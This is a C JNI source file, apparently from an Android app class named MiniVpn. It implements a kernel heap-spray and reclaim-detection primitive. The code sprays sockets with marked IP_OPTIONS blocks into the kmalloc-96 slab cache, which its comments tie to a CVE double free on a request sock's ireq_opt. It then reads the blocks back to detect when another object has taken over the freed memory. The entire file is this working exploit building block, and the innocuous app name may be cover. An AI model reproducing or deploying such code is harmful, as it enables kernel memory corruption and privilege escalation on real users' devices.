#include <jni.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

/*
 * kmalloc-96 helper for the overlap detector.
 *
 * Everything is done here rather than in Java on purpose:
 *
 *   - Java cannot set IP_OPTIONS without libcore.io.Libcore, and on Android 13
 *     Libcore.os resolves to ActivityThread$AndroidOs, which has no
 *     setsockoptBytes method at all (NoSuchMethodException).
 *   - More importantly, a bare new Socket() has no kernel fd until it is bound
 *     or connected, so ParcelFileDescriptor.fromSocket() hands back null.
 *     Doing socket() here sidesteps both problems.
 *
 * An ip_options_rcu is 72 bytes (rcu_head 16 + ip_options 56), so a 40-byte
 * IP_OPTIONS block is served from kmalloc-96 -- the same cache as the request
 * sock's ireq_opt that the CVE-2026-98432 double free targets.
 */

#define OPT_LEN 40

/* NOP + RR(39) with the marker parked in the route data area. */
static void fill_opt(unsigned char *o, int mark)
{
    memset(o, 0, OPT_LEN);
    o[0] = 1;   /* IPOPT_NOP */
    o[1] = 7;   /* IPOPT_RR  */
    o[2] = 39;  /* option length */
    o[3] = 4;   /* route pointer, must be >= 4 */
    o[4] = (unsigned char) (mark & 0xff);
    o[5] = (unsigned char) ((mark >> 8) & 0xff);
    o[6] = (unsigned char) ((mark >> 16) & 0xff);
    o[7] = (unsigned char) ((mark >> 24) & 0xff);
}

/*
 * Create one socket and give it a uniquely marked option block.
 * Returns the fd, or a negative errno on failure.
 */
JNIEXPORT jint JNICALL
Java_com_mini_MiniVpn_nativeChurn(JNIEnv *env, jclass clazz, jint mark)
{
    int fd;
    unsigned char opt[OPT_LEN];

    (void) env;
    (void) clazz;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        return -errno;
    }

    fill_opt(opt, (int) mark);
    if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opt, sizeof(opt)) != 0) {
        int e = errno;
        close(fd);
        return -e;
    }

    return fd;
}

/*
 * Dump the raw option block of a socket so the self-test can show what the
 * kernel actually stored. Writes at most cap bytes, returns the byte count
 * or a negative errno.
 */
JNIEXPORT jint JNICALL
Java_com_mini_MiniVpn_nativeDump(JNIEnv *env, jclass clazz, jint fd,
                                 jbyteArray out)
{
    unsigned char cur[64];
    socklen_t len = sizeof(cur);
    jsize cap;
    jsize n;

    (void) clazz;

    if (out == NULL) {
        return -EINVAL;
    }
    memset(cur, 0, sizeof(cur));
    if (getsockopt((int) fd, IPPROTO_IP, IP_OPTIONS, cur, &len) != 0) {
        return -errno;
    }

    cap = (*env)->GetArrayLength(env, out);
    n = (jsize) len;
    if (n > cap) {
        n = cap;
    }
    if (n > 0) {
        (*env)->SetByteArrayRegion(env, out, 0, n, (const jbyte *) cur);
    }
    return (jint) n;
}

/*
 * Compare the socket's current option block against a previously captured
 * baseline. Using the captured read-back as the reference (rather than
 * rebuilding the expected block from the marker) sidesteps any normalisation
 * the kernel applies on the way in, which otherwise produced a 100% false
 * positive rate.
 *
 * Returns 1 if identical, 0 if it changed (i.e. somebody else owns this
 * memory now), -1 on error.
 */
JNIEXPORT jint JNICALL
Java_com_mini_MiniVpn_nativeCompare(JNIEnv *env, jclass clazz, jint fd,
                                    jbyteArray baseline)
{
    unsigned char cur[64];
    socklen_t len = sizeof(cur);
    jsize blen;
    jbyte *b;
    int r;

    (void) clazz;

    if (baseline == NULL) {
        return -EINVAL;
    }
    blen = (*env)->GetArrayLength(env, baseline);
    b = (*env)->GetByteArrayElements(env, baseline, NULL);
    if (b == NULL) {
        return -ENOMEM;
    }

    memset(cur, 0, sizeof(cur));
    if (getsockopt((int) fd, IPPROTO_IP, IP_OPTIONS, cur, &len) != 0) {
        (*env)->ReleaseByteArrayElements(env, baseline, b, JNI_ABORT);
        return -errno;
    }

    if ((jsize) len != blen) {
        r = 0;
    } else {
        r = (memcmp(cur, b, (size_t) blen) == 0) ? 1 : 0;
    }

    (*env)->ReleaseByteArrayElements(env, baseline, b, JNI_ABORT);
    return r;
}

JNIEXPORT void JNICALL
Java_com_mini_MiniVpn_nativeClose(JNIEnv *env, jclass clazz, jint fd)
{
    (void) env;
    (void) clazz;

    if (fd >= 0) {
        close((int) fd);
    }
}
